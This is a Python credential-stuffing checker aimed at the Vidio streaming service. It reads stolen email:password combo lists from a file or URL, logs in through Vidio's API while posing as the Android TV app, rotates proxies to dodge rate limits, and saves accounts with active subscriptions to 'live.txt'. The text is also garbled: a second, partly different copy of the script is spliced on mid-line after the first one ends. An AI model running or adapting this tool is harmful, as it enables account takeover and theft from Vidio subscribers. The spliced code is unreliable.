import argparse
import os
import re
import uuid
import requests
from colorama import Fore, init

from config import X_API_AUTH
from proxy_manager import ProxyManager

userAgent_vidio = "tv-android/2.46.10 (743)"
xApiInfo_vidio = "tv-android/10/2.46.10-743"

def session_id():
    return str(uuid.uuid4())


def fungsi_login(
    email,
    password,
    user_token=None,
    user_auth_email=None,
    proxy_manager: ProxyManager = None,
    max_retries: int = 3,
):
    headers = {
        "X-Api-Platform": "tv-android",
        "X-Api-Auth": X_API_AUTH,
        "User-Agent": userAgent_vidio,
        "X-Api-App-Info": xApiInfo_vidio,
        "Accept-Language": "id",
        "X-Visitor-Id": session_id(),
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
        "Referer": "androidtv-app://com.vidio.android.tv"
    }

    if user_token and user_auth_email:
        headers["X-User-Email"] = user_auth_email
        headers["X-User-Token"] = user_token

    url = "https://www.vidio.com/api/login"
    param = {
        "login": email,
        "password": password
    }

    attempt = 0
    current_proxy = proxy_manager.get_next_proxy() if proxy_manager else None
    while attempt < max_retries:
        try:
            response = requests.post(
                url,
                headers=headers,
                data=param,
                timeout=10,
                proxies=current_proxy,
            )
            if response.status_code == 200:
                return response
        except requests.RequestException as e:
            print(Fore.RED + f"Request error: {e}")

        attempt += 1
        if proxy_manager:
            current_proxy = proxy_manager.get_next_proxy()

    print(Fore.RED + f"Login gagal untuk {email}")
    return None


def fungsi_get_subs(user_token, email):
    headers = {
        "x-user-email": email,
        "x-user-token": user_token,
        "referer": "androidtv-app://com.vidio.android.tv",
        "x-api-platform": "tv-android",
        "x-api-app-info": xApiInfo_vidio,
        "user-agent": userAgent_vidio,
        "x-visitor-id": session_id(),
        "accept-language": "id",
        "x-api-auth": X_API_AUTH,
        "accept-encoding": "gzip",
        "accept": "application/json",
        "accept-charset": "UTF-8",
        "content-type": "application/json"
    }

    url = "https://api.vidio.com/api/users/has_active_subscription?device=polytron%20h2"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        result = response.json()
        if result.get("has_active_subscription") is True:
            return "ACTIVE"
        elif result.get("has_active_subscription") is False:
            return "INACTIVE"
    except requests.RequestException as e:
        print(Fore.RED + f"Request error saat cek subscription: {e}")
    except ValueError:
        print(Fore.RED + "Gagal parsing JSON response.")
    return None


def save_to_file(email, password, filename="live.txt"):
    entry = f"{email}:{password}"
    if os.path.exists(filename):
        with open(filename, "r") as f:
            data = f.read().splitlines()
        if entry in data:
            print(Fore.YELLOW + f"{email} sudah ada di file, skip...")
            return
    with open(filename, "a") as f:
        f.write(entry + "\n")
    print(Fore.GREEN + f"{email} berhasil disimpan.")


def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None):
    if re.match(r"^https?://", file_akun):
        try:
            resp = requests.get(file_akun, timeout=10)
            resp.raise_for_status()
            lines = resp.text.splitlines()
        except requests.RequestException as e:
            print(Fore.RED + f"Gagal mengambil daftar akun: {e}")
            return
    else:
        with open(file_akun, "r") as f:
            lines = f.read().splitlines()

    pattern = re.compile(r"https?://(?:www\.|m\.)?vidio\.com:(.+?):(.+)")

    for line in lines:
        match = pattern.match(line)
        if not match:
            print(Fore.RED + f"Format salah: {line}")
            continue

        email = match.group(1).strip()
        password = match.group(2).strip()

        print(Fore.CYAN + f"\n[â€¢] Proses login {email}")

        login_response = fungsi_login(email=email, password=password, proxy_manager=proxy_manager)
        if login_response:
            data = login_response.json()
            user_token = data.get("auth", {}).get("authentication_token")
            user_email = data.get("auth", {}).get("email")

            if user_token and user_email:
                subs = fungsi_get_subs(user_token, user_email)
                if subs == "ACTIVE":
                    print(Fore.GREEN + f"[âœ“] {email} Langganan Aktif")
                    save_to_file(email, password)
                elif subs == "INACTIVE":
                    print(Fore.YELLOW + f"[!] {email} Tidak ada langganan aktif")
                else:
                    print(Fore.RED + "Gagal mengecek status langganan")
            else:
                print(Fore.RED + "Token atau email tidak ditemukan di response.")
        else:
            print(Fore.RED + f"Login gagal untuk {email}")


if __name__ == "__main__":
    init(autoreset=True)
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "akun",
        nargs="?",
        default="akun.txt",
        help="Path atau URL daftar akun",
    )
    parser.add_argument(
        "--use-proxy",
        action="store_true",
        help="Gunakan proxy saat melakukan request",
    )
    args = parser.parse_args()

    pm = None
    if args.use_proxy:
        pm = ProxyManager()
        pm.download_proxies()

    proses_akun(args.akun, proxy_manager=pm)        if proxy_manager:
            current_proxy = proxy_manager.get_next_proxy()

    print(Fore.RED + f"Login gagal untuk {email}")
    return None


def fungsi_get_subs(user_token, email):
    headers = {
        "X-Api-Platform": "tv-android",
        "X-Api-Auth": X_API_AUTH,
        "User-Agent": userAgent_vidio,
        "X-Api-App-Info": xApiInfo_vidio,
        "Accept-Language": "id",
        "X-User-Email": email,
        "X-User-Token": user_token,
        "Accept-Encoding": "gzip"
    }

    url = "https://api.vidio.com/api/users/subscriptions"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        product_catalog = response.json()["subscriptions"][0]["product_catalog"]["code"]
        return product_catalog
    except (requests.RequestException, KeyError, IndexError):
        return None


def save_to_file(email, password, filename="live.txt"):
    entry = f"{email}:{password}"
    if os.path.exists(filename):
        with open(filename, "r") as f:
            data = f.read().splitlines()
        if entry in data:
            print(Fore.YELLOW + f"{email} sudah ada di file, skip...")
            return
    with open(filename, "a") as f:
        f.write(entry + "\n")
    print(Fore.GREEN + f"{email} berhasil disimpan.")


def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None):
    if re.match(r"^https?://", file_akun):
        try:
            resp = requests.get(file_akun, timeout=10)
            resp.raise_for_status()
            lines = resp.text.splitlines()
        except requests.RequestException as e:
            print(Fore.RED + f"Gagal mengambil daftar akun: {e}")
            return
    else:
        with open(file_akun, "r") as f:
            lines = f.read().splitlines()

    pattern = re.compile(r"https?://(?:www\.|m\.)?vidio\.com:(.+?):(.+)")
    
    for line in lines:
        match = pattern.match(line)
        if not match:
            print(Fore.RED + f"Format salah: {line}")
            continue

        email = match.group(1).strip()
        password = match.group(2).strip()

        print(Fore.CYAN + f"\n[•] Proses login {email}")

        login_response = fungsi_login(email=email, password=password, proxy_manager=proxy_manager)
        if login_response:
            data = login_response.json()
            user_token = data.get("user", {}).get("user_token")
            user_email = data.get("user", {}).get("email")

            if user_token and user_email:
                subs = fungsi_get_subs(user_token, user_email)
                if subs:
                    print(Fore.GREEN + f"[✓] {email} Langganan Aktif ({subs})")
                    save_to_file(email, password)
                else:
                    print(Fore.YELLOW + f"[!] {email} Tidak ada langganan aktif")
            else:
                print(Fore.RED + "Token atau email tidak ditemukan di response.")
        else:
            print(Fore.RED + f"Login gagal untuk {email}")


if __name__ == "__main__":
    init(autoreset=True)
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "akun",
        nargs="?",
        default="akun.txt",
        help="Path atau URL daftar akun",
    )
    parser.add_argument(
        "--use-proxy",
        action="store_true",
        help="Gunakan proxy saat melakukan request",
    )
    args = parser.parse_args()

    pm = None
    if args.use_proxy:
        pm = ProxyManager()
        pm.download_proxies()

    proses_akun(args.akun, proxy_manager=pm)
